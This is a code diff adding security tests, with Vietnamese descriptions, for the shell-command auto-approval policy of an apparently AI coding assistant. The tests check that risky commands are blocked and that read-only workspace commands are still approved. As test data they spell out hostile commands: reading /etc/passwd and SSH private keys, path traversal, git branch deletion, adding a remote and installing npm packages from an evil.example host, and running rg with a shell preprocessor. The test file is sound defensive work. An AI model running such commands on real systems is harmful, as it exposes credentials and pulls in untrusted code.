@@ -1,6 +1,15 @@
+import { createRequire } from 'node:module';
 import { describe, it, expect, vi } from 'vitest';
 import { isSafeCommand, shouldAutoApprove, targetsProtectedPath } from '@/lib/auto-pilot';
 import { validateSafeRelativePath, isProtectedPath } from '@/lib/path-utils';
+
+const requireCjs = createRequire(import.meta.url);
+const { compileShellCommand } = requireCjs('../lib/shell-policy.cjs') as {
+  compileShellCommand: (
+    raw: string,
+    options?: { workspaceRoot?: string; cwd?: string },
+  ) => { bin: string; args: string[] };
+};
 import { computeSha256, verifyDiskHash, stageFile, emptyStagingStore, serializeStaging, parseStaging } from '@/lib/staging';
 import { ApprovalQueue } from '@/lib/approval-queue';
 
@@ -229,6 +238,62 @@ describe('P0 Security and Data-Integrity Fixes', () => {
       const restored = parseStaging(serialized);
 
       expect(restored['file.txt'].baseHash).toBe(hash);
+    });
+  });
+
+  describe('P0.6: siết auto-approve shell theo audit sandbox (2026-10-08)', () => {
+    it('không tự duyệt lệnh đọc file ngoài workspace', () => {
+      expect(isSafeCommand('cat /etc/passwd')).toBe(false);
+      expect(isSafeCommand('cat /home/user/.ssh/id_rsa')).toBe(false);
+      expect(isSafeCommand('head ../../../etc/hosts')).toBe(false);
+      expect(isSafeCommand('head -n 5 ../../etc/hosts')).toBe(false);
+      expect(isSafeCommand('ls /')).toBe(false);
+      expect(isSafeCommand('grep -r foo /etc')).toBe(false);
+      expect(isSafeCommand('rg TODO ~/.ssh')).toBe(false);
+      expect(isSafeCommand('cat .git/config')).toBe(false);
+    });
+
+    it('không tự duyệt git ghi/exec (branch -D, remote add, tag tạo mới, --output, --no-index)', () => {
+      expect(isSafeCommand('git branch -D main')).toBe(false);
+      expect(isSafeCommand('git branch new-feature')).toBe(false);
+      expect(isSafeCommand('git remote add origin https://evil.example/x.git')).toBe(false);
+      expect(isSafeCommand('git tag v9.9.9')).toBe(false);
+      expect(isSafeCommand('git stash push -m x')).toBe(false);
+      expect(isSafeCommand('git reflog expire --all')).toBe(false);
+      expect(isSafeCommand('git diff --output=/tmp/x')).toBe(false);
+      expect(isSafeCommand('git diff --no-index /etc/passwd /dev/null')).toBe(false);
+      expect(isSafeCommand('rg --pre sh foo .')).toBe(false);
+    });
+
+    it('không tự duyệt npm install global/URL/tarball/git', () => {
+      expect(isSafeCommand('npm install -g x')).toBe(false);
+      expect(isSafeCommand('npm install --global x')).toBe(false);
+      expect(isSafeCommand('npm install https://evil.example/x.tgz')).toBe(false);
+      expect(isSafeCommand('npm install git+https://evil.example/x.git')).toBe(false);
+      expect(isSafeCommand('npm install ./package.tgz')).toBe(false);
+    });
+
+    it('vẫn tự duyệt các dạng chỉ-đọc trong workspace', () => {
+      expect(isSafeCommand('cat package.json')).toBe(true);
+      expect(isSafeCommand('head -n 5 package.json')).toBe(true);
+      expect(isSafeCommand('ls -la src')).toBe(true);
+      expect(isSafeCommand('rg TODO src/')).toBe(true);
+      expect(isSafeCommand('git status --short')).toBe(true);
+      expect(isSafeCommand('git status -sb')).toBe(true);
+      expect(isSafeCommand('git diff HEAD')).toBe(true);
+      expect(isSafeCommand('git log --oneline -5')).toBe(true);
+      expect(isSafeCommand('git branch -a')).toBe(true);
+      expect(isSafeCommand('git branch --show-current')).toBe(true);
+      expect(isSafeCommand('git branch --list feature*')).toBe(true);
+      expect(isSafeCommand('git stash list')).toBe(true);
+    });
+
+    it('compile với workspaceRoot dùng realpath jail cho tham số đường dẫn', () => {
+      const root = process.cwd();
+      expect(() => compileShellCommand('cat /etc/passwd', { workspaceRoot: root })).toThrow();
+      expect(() => compileShellCommand('cat .git/config', { workspaceRoot: root })).toThrow();
+      expect(() => compileShellCommand('cat node_modules/x/index.js', { workspaceRoot: root })).toThrow();
+      expect(compileShellCommand('cat package.json', { workspaceRoot: root }).args).toEqual(['package.json']);
     });
   });
 
